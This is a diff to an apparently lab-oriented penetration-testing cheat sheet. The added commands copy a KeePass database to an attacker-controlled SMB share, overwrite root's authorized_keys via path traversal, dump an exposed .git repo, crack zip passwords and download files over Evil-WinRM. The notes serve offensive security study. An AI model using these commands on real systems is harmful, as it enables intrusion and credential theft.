@@ -267,6 +267,7 @@ unzip file.zip
 7z x file.zip
 tar -xzvf file.tar.gz
 sudo gzip -d rockyou.txt.gz
+unrar x file.rar
 ```
 
 #### PyInstaller
@@ -487,7 +488,7 @@ impacket-smbserver -smb2support newShare . -username test -password test
 Windows:
 
 ```bash
-PS C:\Users\jim\Documents> net use z: \\Kali_IP\newShare /u:test test
+PS C:\Users\jim\Documents> net use z: \\192.168.45.231\newShare /u:test test
 PS C:\Users\jim\Documents> copy Database.kdbx z:\
 ```
 
@@ -537,4 +538,42 @@ Get-NetTCPConnection -LocalPort 8080 | Select-Object -Property OwningProcess | G
 sudo ss -ltnp | grep ':8080'
 # or
 sudo netstat -ltnp | grep ':8080'
+```
+
+#### Overwrite or Modify authorized_keys
+
+```bash
+ssh-keygen
+cat key.pub > ../../../../../../../../../../root/.ssh/authorized_keys
+ssh -i key root@<ip address>
+```
+
+#### Exposed Git Repo from URL
+
+```bash
+wget -r -np -nH --cut-dirs=1 -R "index.html*" http://192.168.211.144/.git/
+# or
+python3 /opt/git-dumper/git_dumper.py http://192.168.211.144/.git .
+```
+
+Then, do:
+
+```bash
+git show <each commit>
+```
+
+#### Cracking Zip File
+
+```bash
+zip2john protected.zip > zip.hash
+john -w=/usr/share/wordlists/rockyou.txt zip.hash
+7z x protected.zip
+```
+
+#### Evil-WinRM Functionality
+
+You can easily download files from the windows machine to your kali vm using:
+
+```bash
+download <remote file path> <local file path>
 ```
